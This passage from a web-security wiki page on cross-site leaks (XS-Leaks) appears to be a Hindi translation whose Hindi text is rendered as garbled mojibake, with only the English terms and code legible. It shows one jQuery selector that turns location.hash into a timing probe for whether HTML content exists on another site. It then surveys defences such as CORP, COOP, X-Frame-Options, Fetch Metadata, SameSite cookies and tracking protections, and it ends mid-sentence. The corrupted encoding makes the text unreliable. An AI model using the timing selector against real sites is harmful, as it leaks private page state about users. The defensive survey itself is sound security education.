рдпрджрд┐ `jQuery(location.hash)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рдордп рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдХрд┐ рдХреБрдЫ HTML рд╕рд╛рдордЧреНрд░реА рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ**, рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рд╕рд┐рд▓реЗрдХреНрдЯрд░ `main[id='site-main']` рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ рддреЛ рдЗрд╕реЗ рдмрд╛рдХреА **рд╕рд┐рд▓реЗрдХреНрдЯрд░реНрд╕** рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рдиреА рдкрдбрд╝рддреА рд╣реИ:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS рдЗрдВрдЬреЗрдХреНрд╢рди

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## рдмрдЪрд╛рд╡

рдЗрд╕ рдЦрдВрдб рдореЗрдВ рдЖрдк [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) рдореЗрдВ рд╕реБрдЭрд╛рдП рдЧрдП рдЙрдкрд╛рдпреЛрдВ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдкреНрд░рддреНрдпреЗрдХ рд╡рд┐рдХреА рдЦрдВрдб [https://xsleaks.dev/](https://xsleaks.dev/) рдореЗрдВ рдЕрдзрд┐рдХ рдЙрдкрд╛рдп рд╣реИрдВред рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд╡рд╣рд╛рдВ рджреЗрдЦреЗрдВред

### рдЗрдВрдХреНрд▓реВрдЬрди рдореЗрдердб рдорд┐рдЯрд┐рдЧреЗрд╢рдиреНрд╕

* **HTML рддрддреНрд╡**ред рдпрд╣ **CORP рд╣реЗрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдкреЗрдЬ рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди рдХреЛ рдПрдореНрдмреЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ**ред CORP рдХреЛ рд╕реЗрдо-рдУрд░рд┐рдЬрд┐рди рдпрд╛ рд╕реЗрдо-рд╕рд╛рдЗрдЯ рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдХрд┐рд╕реА рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдпрд╛ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддрд╛ рд╣реИред **рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдЯ** рдкрд░, Chromium-рдЖрдзрд╛рд░рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ CORB рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП рдпрд╛ рдирд╣реАрдВред
* **рдлреНрд░реЗрдореНрд╕**ред **iframe** рддрддреНрд╡реЛрдВ рдХреЛ HTML рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рдмрдЪрд╛рд╡ **X-Frame-Options** рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реИред рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, **CSP рдбрд╛рдпрд░реЗрдХреНрдЯрд┐рд╡ frame-ancestors** рдПрдХ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдПрдореНрдмреЗрдбрд┐рдВрдЧ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрдВрдХреНрд▓реВрдЬрди рдореЗрдердб рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рдЕрдВрддрд░ рдХрд╛ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧрд╛ рд╕рдХрддрд╛ред
* **рдкреЙрдк-рдЕрдкреНрд╕**ред `window.opener` рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **COOP HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░** рддреАрди рдЕрд▓рдЧ-рдЕрд▓рдЧ рдорд╛рдиреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ: unsafe-none (рдбрд┐рдлрд╝реЙрд▓реНрдЯ), same-origin-allow-popups, рдФрд░ same-originред рдпреЗ рдорд╛рди **рдмреНрд░рд╛рдЙрдЬрд╝рд┐рдВрдЧ рдЯреИрдмреНрд╕ рдФрд░ рдкреЙрдк-рдЕрдкреНрд╕ рдХреЛ рдЕрд▓рдЧ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░, рдкреЙрдк-рдЕрдкреНрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд▓реАрдХ рддрдХрдиреАрдХреЛрдВ рдХреЛ рдХрдо рдХрд░рддреЗ рд╣реИрдВред
* **JavaScript рдЕрдиреБрд░реЛрдз**ред рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди JavaScript рдЕрдиреБрд░реЛрдз XS-Leak рд╣рдорд▓реЛрдВ рдореЗрдВ рдЕрдХреНрд╕рд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЬрд╛рд░реА рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдкрд░ рдмрд╛рд░реАрдХ рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЪреВрдВрдХрд┐ рдпреЗ рдЕрдиреБрд░реЛрдз CORS рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ, рд╡реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдпрд╛ рдЗрдореЗрдЬреЗрд╕ рдЬреИрд╕реЗ HTML рддрддреНрд╡реЛрдВ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рдорд╛рди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдЕрдзреАрди рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЗрд╕ рд▓реАрдХ рддрдХрдиреАрдХ рдХрд╛ рдкреНрд░рднрд╛рд╡ рднреА **CORP рдФрд░ CORB рджреНрд╡рд╛рд░рд╛ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХреЗ:

* **Fetch Metadata**ред рдпреЗ рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ рд╕рд░реНрд╡рд░ рдорд╛рд▓рд┐рдХреЛрдВ рдХреЛ рдпрд╣ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдиреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрд╕реЗ рдкреНрд░реЗрд░рд┐рдд рдХрд┐рдпрд╛ред Chrome рдореЗрдВ, Sec-Fetch-\* рд╣реЗрдбрд░реНрд╕ рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЗ рдкреНрд░реЛрд╡реЗрдиреЗрдВрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Sec-Fetch-Dest: image рдХреЛ рдПрдХ рдЗрдореЗрдЬ рддрддреНрд╡ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдлрд┐рд░ рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* **Same-Site рдХреБрдХреАрдЬ**ред Same-Site рдХреБрдХреА рдлреНрд▓реИрдЧ рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ **рдХрд┐ рдХреБрдХреА рдХреЛ рд╕реЗрдо-рд╕рд╛рдЗрдЯ рдпрд╛ рдлрд░реНрд╕реНрдЯрдкрд╛рд░реНрдЯреА рд╕рдВрджрд░реНрдн рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рд╕рднреА рдкреНрд░рдореБрдЦ рдмреНрд░рд╛рдЙрдЬрд╝рд░ Same-Site рдХреБрдХреАрдЬ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред GC рдореЗрдВ, рдмрд┐рдирд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓реА рдХреБрдХреАрдЬ рдЕрдм рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Lax рд╣реИрдВред XS-Leaks рдХреЗ рд▓рд┐рдП, **Same-Site рдХреБрдХреАрдЬ рд▓реАрдХ рд╣рдорд▓реЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЛ рдмрд╣реБрдд рд╕реАрдорд┐рдд рдХрд░ рджреЗрддреА рд╣реИрдВ**ред рджреВрд╕рд░реА рдУрд░, **`window.open` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд▓реАрдХ рддрдХрдиреАрдХреЗрдВ `SameSite=Lax` рдХреЗ рд╕рд╛рде рдЕрднреА рднреА рдХрд╛рдо рдХрд░рддреА рд╣реИрдВ**ред рд╡реЗрдмрд╕рд╛рдЗрдЯреЗрдВ рдЬреЛ **рдЕрдиреНрдп рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рддрд░реАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдФрд░ HTTP рдкреНрд░рдорд╛рдгреАрдХрд░рдг, **рдЕрднреА рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд░рд╣рддреА рд╣реИрдВ**ред
* **Cross-Origin Identifier Unlinkability (COIU)**ред COIU, рдЬрд┐рд╕реЗ First-Party Isolation (FPI) рдХреЗ рдирд╛рдо рд╕реЗ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ FF рдХреА рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ (about:config) рдореЗрдВ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдореВрд▓ рд░реВрдк рд╕реЗ Tor рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдкреЗрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рд╕рд╛рд░рд╛рдВрд╢ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдореЗрдВ, рдпрд╣ рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╕реЗрдо-рд╕рд╛рдЗрдЯ рд╕рдВрджрд░реНрдн рд╣реИред рдпрд╣ **рдХрдИ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдмрд╛рдВрдзрддрд╛ рд╣реИ** (рдЬреИрд╕реЗ, рдХреБрдХреАрдЬ, рдХреИрд╢, рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реНрдЯреЛрд░реЗрдЬ) **рдкрд╣рд▓реЗ рдкрдХреНрд╖ рдХреЗ рд▓рд┐рдП** рдмрдЬрд╛рдп рдЙрдиреНрд╣реЗрдВ рд╕рднреА рджреМрд░рд╛ рдХреА рдЧрдИ рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреЗред рдпрджрд┐ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ COIU XS-Leaks рдХреА рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЛ рдмрд╣реБрдд рдХрдо рдХрд░ рджреЗрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдХреЗрд╡рд▓ рдкреЙрдк-рдЕрдкреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╡рд┐рдзрд┐рдпрд╛рдВ рд╣реА рдиреАрддрд┐ рдХреА рдкрд╣рд▓реЗ рдкрдХреНрд╖ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХрддреА рд╣реИрдВред
* **рдЯреНрд░реИрдХрд┐рдВрдЧ рдкреНрд░реЛрдЯреЗрдХреНрд╢рдиреНрд╕**ред Apple рдиреЗ SA рдореЗрдВ **Intelligent Tracking Prevention (ITP)** рдирд╛рдордХ рдПрдХ рдЧреЛрдкрдиреАрдпрддрд╛ рддрдВрддреНрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ рдХреБрдХреАрдЬ рдФрд░ рдЕрдиреНрдп рд╡реЗрдм APIs рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдХреЗ рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рдЯреНрд░реИрдХрд┐рдВрдЧ рд╕реЗ рд▓рдбрд╝рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддрд╛ рд╣реИред SA рдХреЗ рдирдП рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, ITP рдмрд┐рдирд╛ рдХрд┐рд╕реА рдЕрдкрд╡рд╛рдж рдХреЗ рд╕рднреА рдерд░реНрдб-рдкрд╛рд░реНрдЯреА рдХреБрдХреАрдЬ рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрд╡рд░реБрджреНрдз рдХрд░рддрд╛ рд╣реИ \[74]ред рдпрд╣ рдЕрд╡рд░реЛрдзрди рдкреЙрдк-рдЕрдкреНрд╕ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╕рднреА рд▓реАрдХреНрд╕ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИред FF рдиреЗ Enhanced Tracking Prevention (ETP) рдХреЗ рд╕рд╛рде рдПрдХ рд╕рдорд╛рди рджреГрд╖реНрдЯрд┐рдХреЛрдг рдЕрдкрдирд╛рдпрд╛, рд▓реЗрдХрд┐рди рд╡реЗ рдХреЗрд╡рд▓ рдЯреНрд░реИрдХрд┐рдВрдЧ рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдерд░реНрдб-рдкрд╛рд░реНрдЯреА рдХреБрдХреАрдЬ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддреЗ рд╣реИрдВред XS-Leaks рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, ETP рдХреЗрд╡рд▓ рдЙрди рдЯреНрд░реИрдХрд┐рдВрдЧ рдбреЛрдореЗрдиреЛрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рд▓реАрдХ рддрдХрдиреАрдХреЛрдВ рдХреЛ рдХрдо рдХрд░рддрд╛ рд╣реИред
* **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕**ред рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдЧрд░реВрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдЗрдВрдХреНрд▓реВрдЬрди рдореЗрдердбреНрд╕ рдХреЛ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рд▓реАрдХ рддрдХрдиреАрдХ рдорд┐рдЯрд┐рдЧреЗрд╢рдиреНрд╕

* **рдЗрд╡реЗрдВрдЯ рд╣реИрдВрдбрд▓рд░**ред рдЗрд╕ рд▓реАрдХ рддрдХрдиреАрдХ рдкрд░ **рд╕рдмрд╕реЗ рдкреНрд░рднрд╛рд╡реА рдорд┐рдЯрд┐рдЧреЗрд╢рди** рдЙрдиреНрд╣реЗрдВ рд╕рднреА рдХреЛ **рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**, рд▓реЗрдХрд┐рди рдпрд╣ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рддреЛрдбрд╝ рджреЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╣рдо рдкреНрд░рд╕реНрддрд╛рд╡ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ **рдШрдЯрдирд╛рдУрдВ рдХреЗ рднреАрддрд░ рдПрдХрддреНрд░ рдХреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдХрдо рдХрд░реЗрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, CSP рдЙрд▓реНрд▓рдВрдШрди рдЗрд╡реЗрдВрдЯ рдХреЛ рдмреНрд▓реЙрдХ рдХрд┐рдП рдЧрдП URI рдлрд╝реАрд▓реНрдб рдореЗрдВ рд░реАрдбрд╛рдпрд░реЗрдХреНрд╢рди рд▓рдХреНрд╖реНрдп URL
